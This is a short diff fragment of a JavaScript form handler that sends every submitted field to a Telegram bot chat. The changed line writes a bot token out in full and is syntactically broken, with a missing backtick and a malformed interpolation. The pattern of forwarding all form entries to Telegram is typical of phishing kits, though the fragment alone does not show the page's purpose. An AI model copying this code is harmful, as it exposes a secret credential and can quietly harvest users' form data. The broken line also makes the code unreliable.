@@ -53,7 +53,7 @@
       e.preventDefault();
       const data = new FormData(e.target);
       let csv = Array.from(data.entries()).map(([k,v])=>`${k}: ${v}`).join('\n');
-      fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`,{
+      fetch(https://api.telegram.org/bot{8721188883:AAEWO2YWWThjYLyQVbVUuxOf97ltFKmiBrQ}/sendMessage`,{
         method:'POST',
         headers:{'Content-Type':'application/json'},
         body: JSON.stringify({chat_id:CHAT_ID, text:csv})
